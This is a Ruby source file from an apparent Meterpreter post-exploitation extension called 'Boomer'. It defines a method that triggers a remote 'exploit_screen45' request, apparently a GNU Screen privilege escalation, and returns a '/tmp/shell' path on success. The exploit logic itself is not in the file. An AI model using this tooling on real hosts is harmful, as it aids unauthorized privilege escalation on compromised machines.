# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/boomer/tlv'
require 'rex/post/meterpreter/extensions/boomer/module'
require 'set'

module Rex
module Post
module Meterpreter
module Extensions
module Boomer
module Linux

###
#
# Authors: Josu√© Encinar && Antonio Marcos
#
###
class Exploit < Module
 def initialize(client)
    super(client)
  end

  def screenploit()
    request = Packet.create_request('exploit_screen45')
    puts "running exploit"
    result = go_request(request)
    if result[:result]
     r = result[:result]
     if r.include? "Error"
        puts(@red + "[-] " + @reset + r)
       return
     end
     puts(@green + "[+] " + @reset +"Exploit ready! ")
     print "Launch(y/n): "
     input = gets.chomp
     out = nil
     if input != "n"
       out = "/tmp/shell"
     end
     return out
   end
 end

end

end; end; end; end; end; end
